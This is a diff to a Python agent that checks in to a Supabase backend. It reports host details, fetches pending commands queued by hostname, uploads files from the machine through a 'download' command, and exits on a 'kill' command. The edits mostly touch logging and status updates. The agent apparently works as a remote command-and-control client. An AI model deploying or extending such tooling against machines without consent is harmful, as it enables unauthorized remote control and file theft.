@@ -32,10 +32,10 @@ def reset_agent_status():
         if response.data:
             logging.info(f"Status for {hostname} reset to 'Checked-In'.")
         else:
-            logging.warning(f"Failed to update status for {hostname}. Error details: {response.text}")
+            logging.warning(f"Failed to update status for {hostname}. Error details: {response.json()}")
     except Exception as e:
-        logging.error(f"An error occurred while updating the agent status: {e}")
-
+        #logging.error(f"An error occurred while updating the agent status: {str(e)}")
+        logging.error(f"An error occurred: {repr(e)}")
 
 def get_system_info():
     """Retrieve the hostname, IP address, and OS of the current system."""
@@ -77,7 +77,8 @@ def fetch_settings():
                 'os': os_info,
                 'timeout_interval': DEFAULT_TIMEOUT,
                 'check_in': DEFAULT_CHECK_IN,
-                'last_checked_in': now
+                'last_checked_in': now,
+                'username': ''  # Default empty string for username (no comment here)
             }).execute()
         except Exception as e:  # Catch all exceptions during insert
             logging.error(f"An error occurred while inserting settings: {e}")
@@ -89,15 +90,20 @@ def fetch_pending_commands_for_hostname(hostname):
     return supabase.table('py2').select('*').eq('status', 'Pending').eq('hostname', hostname).execute()
 
 def update_command_status(command_id, status, output='', hostname='', ip='', os='', username=''):
-    """Update the status, output, and system info of a command."""
-    supabase.table('py2').update({
+    command_data = {
         'status': status,
         'output': output,
-        'hostname': hostname,
-        'ip': ip,
-        'os': os,
-        'username': username
-    }).eq('id', command_id).execute()
+        'hostname': hostname if hostname else '',
+        'ip': ip if ip else '',
+        'os': os if os else '',
+    }
+
+    # Add username to the update only if it's not None
+    if username:
+        command_data['username'] = username
+
+    supabase.table('py2').update(command_data).eq('id', command_id).execute()
+
 
 def handle_download_command(command_text, username):
     """Handle the 'download' command by uploading the file to Supabase storage and updating the downloads table."""
@@ -256,6 +262,7 @@ def handle_kill_command(command_id, command_text, hostname):
             logging.info("Shutdown sequence initiated.")
             os._exit(0)  # Force the agent to terminate
 
+
 def update_settings_status(hostname, status):
     """Update the check-in status of the hostname in the settings table."""
     try:
@@ -263,12 +270,21 @@ def update_settings_status(hostname, status):
             'check_in': status
         }).eq('hostname', hostname).execute()
 
-        if response.status_code == 200: # changed from response.data to response.status_code
+        if response.status_code == 200 and response.data:
             logging.info(f"Status for {hostname} updated to {status}.")
+        elif response.status_code == 200 and not response.data:
+            # Check if the row existed before the update
+            exists_response = supabase.table('settings').select().eq('hostname', hostname).execute()
+            if exists_response.data:
+                logging.info(f"Status for {hostname} updated to {status}.")  # Row existed, update successful
+            else:
+                logging.warning(f"Failed to update status for {hostname}: Row not found")  # Row didn't exist
         else:
-            logging.warning(f"Failed to update status for {hostname}. Error details: {response.json()}") # changed this
+            logging.warning(f"Failed to update status for {hostname}. Error details: {response.json()}")  # Log error details
     except Exception as e:
         logging.error(f"An error occurred while updating status for {hostname}: {e}")
+
+
 
 if __name__ == '__main__':
     reset_agent_status()
